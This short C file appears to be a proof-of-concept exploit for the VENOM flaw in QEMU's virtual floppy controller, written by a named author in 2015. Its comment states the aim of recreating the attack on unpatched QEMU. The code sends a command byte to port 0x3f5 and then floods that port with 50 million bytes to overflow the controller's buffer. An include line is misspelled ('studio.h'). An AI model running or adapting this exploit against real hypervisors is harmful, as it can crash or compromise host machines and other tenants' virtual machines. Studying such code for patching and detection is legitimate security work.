#include<studio.h>
#include<sys/io.h>
/*this is a test code
It's aim is to exploit and recreate possible Venom attack on QEMU before patch
6/2/2015  Yihao Zhang*/
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define MAX_COUNT  50000000
void main(void){
	outb(SPC_COMMAND, FIFO);
	int i,j;
	j = 0;
	for(i=0; i<MAX_COUNT; i++ ){
		outb(j,0x3f5);
		j =(j+1)%100;
	}

}


